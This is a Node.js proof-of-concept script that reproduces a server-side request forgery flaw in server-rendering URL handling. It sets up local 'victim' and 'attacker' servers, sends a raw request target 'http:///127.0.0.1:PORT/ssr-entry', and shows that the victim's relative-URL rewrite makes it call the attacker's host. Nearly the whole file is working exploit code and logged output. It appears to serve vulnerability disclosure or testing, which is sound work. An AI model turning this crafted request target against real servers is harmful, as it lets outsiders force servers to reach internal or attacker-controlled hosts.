import http from 'node:http';
import net from 'node:net';

function parseUrl(urlStr, origin) {
  if (URL.canParse(urlStr)) {
    return new URL(urlStr);
  }

  if (urlStr && urlStr[0] !== '/') {
    urlStr = `/${urlStr}`;
  }

  return new URL(origin + urlStr);
}

function platformLocationFromInitialConfig(initialUrl, documentOrigin) {
  const parsed = parseUrl(initialUrl, documentOrigin);
  return {
    href: parsed.href,
    protocol: parsed.protocol,
    hostname: parsed.hostname,
    port: parsed.port,
    baseHref: '',
  };
}

function serverHttpRelativeRewrite(requestUrl, platformLocation) {
  const {href, protocol, hostname, port} = platformLocation;
  let urlPrefix = `${protocol}//${hostname}`;
  if (port) {
    urlPrefix += `:${port}`;
  }
  const baseHref = platformLocation.baseHref || href;
  const baseUrl = new URL(baseHref, urlPrefix);
  return new URL(requestUrl, baseUrl).toString();
}

function listen(server) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => resolve(server.address().port));
  });
}

async function httpGet(url) {
  return new Promise((resolve, reject) => {
    const request = http.get(url, (response) => {
      response.resume();
      response.on('end', () => resolve(response.statusCode));
    });
    request.once('error', reject);
  });
}

async function rawHttpRequest(port, requestTarget) {
  return new Promise((resolve, reject) => {
    const socket = net.connect({host: '127.0.0.1', port}, () => {
      socket.write(
        `GET ${requestTarget} HTTP/1.1\r\n` +
          `Host: victim.test\r\n` +
          `Connection: close\r\n\r\n`,
      );
    });
    let response = '';
    socket.setEncoding('utf8');
    socket.on('data', (chunk) => {
      response += chunk;
    });
    socket.on('end', () => resolve(response));
    socket.once('error', reject);
  });
}

const attackerHits = [];
const attacker = http.createServer((req, res) => {
  attackerHits.push({method: req.method, url: req.url, host: req.headers.host});
  res.writeHead(200, {'content-type': 'text/plain'});
  res.end('attacker-ok');
});
const attackerPort = await listen(attacker);

const victimEvents = [];
const victim = http.createServer(async (req, res) => {
  try {
    const documentOrigin = 'http://victim.test';
    const platformLocation = platformLocationFromInitialConfig(req.url, documentOrigin);
    const rewrittenUrl = serverHttpRelativeRewrite('/internal-marker', platformLocation);
    const status = await httpGet(rewrittenUrl);
    victimEvents.push({
      nodeReqUrl: req.url,
      platformLocation,
      rewrittenUrl,
      outboundStatus: status,
    });
    res.writeHead(200, {'content-type': 'text/plain'});
    res.end('victim-ok');
  } catch (error) {
    victimEvents.push({nodeReqUrl: req.url, error: String(error?.stack || error)});
    res.writeHead(500, {'content-type': 'text/plain'});
    res.end('victim-error');
  }
});
const victimPort = await listen(victim);

try {
  const requestTarget = `http:///127.0.0.1:${attackerPort}/ssr-entry`;
  const victimResponse = await rawHttpRequest(victimPort, requestTarget);

  console.log(JSON.stringify(
    {
      sentRawRequestTarget: requestTarget,
      victimPort,
      attackerPort,
      victimResponseStatusLine: victimResponse.split('\r\n')[0],
      victimEvents,
      attackerHits,
    },
    null,
    2,
  ));
} finally {
  victim.close();
  attacker.close();
}
